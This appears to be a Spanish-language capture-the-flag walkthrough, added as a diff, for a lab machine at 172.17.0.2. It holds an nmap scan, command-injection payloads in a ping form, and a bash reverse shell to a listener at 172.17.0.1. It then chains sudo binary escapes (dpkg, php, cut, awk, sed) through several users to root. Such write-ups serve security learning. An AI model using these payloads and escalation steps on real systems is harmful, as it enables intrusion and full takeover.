@@ -1,0 +1,121 @@
+# Enumeracion de Puertos, Servicios y Versiones
+
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+443/tcp  open  ssl/http syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+5000/tcp open  upnp?    syn-ack ttl 64
+
+si chequeamos se trata de 3 servicios web, por el puerto 80 y 443 nos conseguimos un la plantilla de apache
+y por el puerto 5000, vemos una web que lo que hace es solicitar una ip para realizar una traza ICMP
+
+en la web levantada en el puerto 5000, intento ejecucion de comandos y es posible
+
+172.17.0.2; ls
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+
+8.8.8.8; whoami
+freddy
+
+ahora me coloco en escucha por netcat :
+nc -lnvp 4444 
+
+luego envio la reverse shell :
+172.17.0.2 | bash -c  "/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"
+
+chequeamos netcat y hemos recibido la reverse shell
+
+# Escalada de Privilegios
+
+User freddy
+________________
+
+script /dev/null -c bash 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+
+sudo -l
+    (bobby) NOPASSWD: /usr/bin/dpkg
+
+sudo -u bobby /usr/bin/dpkg -l
+!/bin/bash
+
+user bobby
+_______________
+
+sudo -l
+    (gladys) NOPASSWD: /usr/bin/php
+
+sudo -u gladys /usr/bin/php -r "system('/bin/bash');"
+
+aqui estuve un rato pero me fallo mucho despues de ser el user gladys, asi que 
+me volvi a colocar en escucha por el el puerto 4445 y desde el user bobby envie
+envie una reverse shell
+
+script /dev/null -c bash
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+
+sudo -u gladys /usr/bin/php -r "system('/bin/bash');"
+
+me vuelvo a colocar en escucha por otro puerto y envio una nueva reverse shell
+
+script /dev/null -c bash
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+
+
+user gladys
+_______________
+
+sudo -l
+
+    (chocolatito) NOPASSWD: /usr/bin/cut
+
+con el binario cut podemos extraer texto, asi que vamos a buscar archivos en el sistema
+del user chocolatito
+
+find / -type f -user chocolatito 2>/dev/null
+/opt/chocolatitocontraseña.txt
+
+ls -la /opt/chocolatitocontraseña.txt
+-r-------- 1 chocolatito chocolatito 20 May 19 14:33 /opt/chocolatitocontraseña.txt
+
+no podemos leerlo directamente, pero si que podemos a traves del binario cut ya que
+lo podemos ejecutar como el user chocolatito
+
+sudo -u chocolatito cut -f 1 /opt/chocolatitocontraseña.txt
+chocolatitopassword
+
+su chocolatito
+pass:chocolatitopassword
+
+user chocolatito
+___________________
+
+sudo -l
+    (theboss) NOPASSWD: /usr/bin/awk
+
+sudo -u theboss /usr/bin/awk 'BEGIN {system("/bin/bash")}'
+
+user theboss
+___________________
+
+sudo -l
+    (root) NOPASSWD: /usr/bin/sed
+
+sudo /usr/bin/sed -n '1e exec bash 1>&0' /etc/hosts
+
+#root
